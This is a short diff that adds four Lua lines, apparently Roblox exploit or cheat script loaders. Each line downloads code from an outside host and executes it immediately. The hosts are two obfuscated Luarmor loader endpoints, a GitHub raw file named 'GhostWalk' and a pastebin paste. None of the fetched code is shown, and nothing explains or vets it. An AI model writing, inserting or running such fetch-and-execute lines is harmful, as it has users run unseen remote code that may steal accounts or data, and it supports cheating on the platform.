@@ -1,0 +1,4 @@
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a3411ec1779e8f1f1a2986c22d35f50c.lua"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/af487c213fc26278d57976f8e03a1b5b.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/403k/UnwalkAnimation/refs/heads/main/GhostWalk", true))()
+loadstring(game:HttpGet("https://pastebin.com/raw/yWZSqK7X"))()
